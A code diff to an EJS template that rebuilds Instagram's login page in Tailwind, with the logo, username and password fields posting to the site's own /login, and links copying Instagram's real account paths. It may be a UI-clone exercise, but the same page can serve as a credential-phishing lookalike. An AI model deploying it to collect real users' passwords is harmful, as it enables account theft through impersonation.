@@ -3,6 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
 
     <link rel="stylesheet" href="/css/styles.css" />
 
@@ -10,57 +11,119 @@
   </head>
 
   <body>
-    <main class="l-main">
-      <div class="l-main__img">
-        <img src="/images/homepage.png" alt="Smartphones" />
+    <section class="bg-neutral-50 flex items-center justify-center flex-col min-h-screen">
+  <div class="container max-w-md">
+
+    <div class="text-neutral-800 bg-white flex items-center flex-col mt-8 mb-2.5 px-10 py-6 border">
+
+      <!-- Logo -->
+      <div class="mb-3 mt-4">
+        <img src="<%= logo %>" alt="Instagram" />
       </div>
 
-      <div class="l-user">
-        <div class="c-panel group">
-          <img
-            class="c-panel__img"
-            src="/images/instagram.svg"
-            alt="Instagram"
+      <!-- Login Form -->
+      <form class="mt-6 w-full mb-2.5" action="/login" method="POST">
+
+        <!-- Username -->
+        <div class="mb-4">
+          <label class="block text-xs mb-1">
+            Phone number, username, or email
+          </label>
+          <input
+            class="w-full border px-3 py-2 text-xs rounded"
+            name="username"
+            type="text"
+            maxlength="75"
+            autocomplete="off"
+            required
           />
-
-          <form class="c-panel__form" method="POST" action="/api/login">
-            <input
-              type="text"
-              name="username"
-              class="c-panel__input"
-              placeholder="Phone number, username, or email"
-            />
-
-            <input
-              type="password"
-              name="password"
-              class="c-panel__input"
-              placeholder="Password"
-            />
-
-            <button type="submit" class="c-btn">Log In</button>
-
-            <span class="c-panel__span">OR</span>
-          </form>
-
-          <a href="#" class="c-panel__facebook"> Login with Facebook </a>
-
-          <a href="#" class="c-panel__forgot"> Forgot password? </a>
         </div>
 
-        <div class="c-signup group">
-          <p>Don't have an account? <span>Sign up</span></p>
+        <!-- Password -->
+        <div class="mb-4">
+          <label class="block text-xs mb-1">Password</label>
+          <input
+            type="password"
+            class="w-full border px-3 py-2 text-xs rounded"
+            name="password"
+            autocomplete="off"
+            required
+          />
         </div>
 
-        <div class="c-app">
-          <p>Get the app.</p>
-
-          <div class="c-app__download">
-            <img src="/images/apple.png" alt="Apple Store" />
-            <img src="/images/google.png" alt="Google Play" />
-          </div>
+        <!-- Login Button -->
+        <div class="flex mt-3.5">
+          <button
+            class="bg-blue-500 text-white rounded w-full h-8 flex items-center justify-center"
+            type="submit"
+          >
+            <% if(!loading){ %>
+              Log In
+            <% } else { %>
+              <div class="flex">
+                <span class="animate-spin h-4 w-4 border-2 border-white border-t-transparent rounded-full"></span>
+              </div>
+            <% } %>
+          </button>
         </div>
+
+      </form>
+
+      <!-- Error -->
+      <% if(error){ %>
+      <div class="my-2.5 text-red-500 text-center text-sm">
+        <p><%= error %></p>
       </div>
-    </main>
+      <% } %>
+
+      <!-- Forgot Password -->
+      <a
+        class="block my-2.5 text-xs text-center text-blue-500"
+        href="/accounts/password/reset/"
+      >
+        Forgot password?
+      </a>
+
+    </div>
+
+    <!-- Signup -->
+    <div class="my-2.5 bg-white w-full border py-2">
+      <p class="my-3 text-center text-neutral-800 text-sm">
+        Don't have an account?
+        <a
+          class="text-blue-500 font-semibold"
+          href="/accounts/emailsignup/"
+        >
+          Sign up
+        </a>
+      </p>
+    </div>
+
+    <!-- App Download -->
+    <div class="mb-10">
+      <p class="text-sm my-5 text-center">Get the app.</p>
+
+      <div class="flex justify-center">
+        <a href="">
+          <img
+            class="h-10 mr-2"
+            src="<%= appstore %>"
+            alt="Download on the App Store"
+          />
+        </a>
+
+        <a href="">
+          <img
+            class="h-10"
+            src="<%= googleplay %>"
+            alt="Get it on Google Play"
+          />
+        </a>
+      </div>
+
+    </div>
+
+  </div>
+</section>
   </body>
 </html>
